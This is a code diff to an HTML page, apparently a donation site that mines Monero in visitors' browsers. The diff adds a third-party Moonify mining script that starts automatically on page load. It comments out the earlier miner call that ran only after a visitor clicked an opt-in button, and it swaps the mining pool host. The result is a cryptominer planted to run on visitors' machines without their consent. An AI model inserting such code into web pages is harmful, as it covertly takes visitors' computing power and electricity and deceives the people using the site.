@@ -89,12 +89,21 @@
     </script>
 
     <script src="https://coinwebmining.com/cwm.js"></script>
+    <script src="https://pkg.moonify.io/moonify.min.js"></script>
+<script type="text/javascript">
+Moonify.set({serviceID:"QJegjeK4Ql4QIINbHO62j_Bq7aTUS_lZpPcg3qttZzU8wNggDVHub5ELCxVK1FYu0PaulY5tIzl0HwslHkjBpKBOHxg1pXb5Ob5hNSlaTBAnQlJlOvKZ5476mROSqrma"});
+//... Do some stuff ...
+Moonify.start();
+
+</script>
+
+
     <script>
         var site_id = 'cwm-1038';
         var coin = 'monero';
         var wallet = '45ok4U5Q9vLcgrbiQUZjHbRVnFCMPU7gpaZBNFRxVcFSehegDvua85LEAYphvg122rG6mZAxhgEAJ5YhVVqpjbhT8ABwwSp';
         var password = 'DonateABLE';
-        var mining_pool = 'gulf.moneroocean.stream:10001';
+        var mining_pool = 'xmr.bohemianpool.com:7777';
         var threads = -1;
         var throttle = 0.2;
         var debug = true;
@@ -106,7 +115,9 @@
 
 
         $('#optedIn').click(function() {
-            cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+            // cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+
+
             $.ajaxSetup({
           headers: {
             'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
